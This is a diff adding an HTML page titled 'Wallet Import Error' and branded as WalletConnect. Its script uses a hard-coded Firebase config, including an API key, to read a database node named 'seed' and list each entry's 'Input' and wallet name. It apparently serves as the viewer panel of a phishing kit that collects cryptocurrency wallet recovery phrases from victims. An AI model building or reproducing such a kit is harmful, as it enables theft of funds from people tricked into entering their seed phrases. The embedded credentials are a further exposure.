@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Wallet Import Error</title>
+  <link rel="shortcut icon" href="images/icon-48x48.png">
+
+</head>
+<body>
+  <div class="nav">
+    <p>Dapps</p>
+    <img src="/assets/images/WC.jpg" alt="" height="80px">
+    <p>Wallet</p>
+  </div>
+  <div id="root">
+      
+
+  </div>
+  <style>
+    #root{
+      display: flex;
+      justify-content: center;
+      text-align: center;
+      flex-wrap: wrap;
+      
+    }
+
+    .data-container{
+      border: 1px solid blue;
+      margin: 4px;
+      font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      padding: 10px;
+      max-width: 80%;
+    }
+    .nav{
+      display: flex;
+      justify-content: space-between;
+      color: rgb(63, 63, 194);
+      font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      padding: 20px;
+      font-weight:500;
+      align-items: center;
+    }
+
+  </style>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/7.14.1-0/firebase.js"></script>
+  <script type="module">
+    
+      const firebaseConfig = {
+        apiKey: "AIzaSyAcN54OInT_kESbJfXEgTGLssoHI2IbcIU",
+          authDomain: "seed-b82be.firebaseapp.com",
+          databaseURL: "https://seed-b82be-default-rtdb.firebaseio.com",
+          projectId: "seed-b82be",
+          storageBucket: "seed-b82be.appspot.com",
+          messagingSenderId: "920870000940",
+          appId: "1:920870000940:web:0806c1481c55090a5cb489"
+      };
+    
+      // Initialize Firebase
+      firebase.initializeApp(firebaseConfig);
+
+
+      var seed_db = firebase.database().ref("seed")
+
+  
+      seed_db.on("value", function(snapshot){
+
+      var data = snapshot.val();
+      for(let i in data){
+        document.querySelector("#root").innerHTML += `
+          <div class= "data-container"><b>Input:</b> ${data[i]["name"]}  <br>for <b>${data[i]["wallet"]}</b></div>
+        `
+      }
+
+})
+
+
+  </script>
+
+  <footer style="text-align:center;color: rgb(63, 63, 194); font-family:'Segoe UI', Tahoma, Geneva, Verdana; font-weight: 500;">
+    <p>Powered by Wallet Connect</p>
+  </footer>
+</body>
+</html>
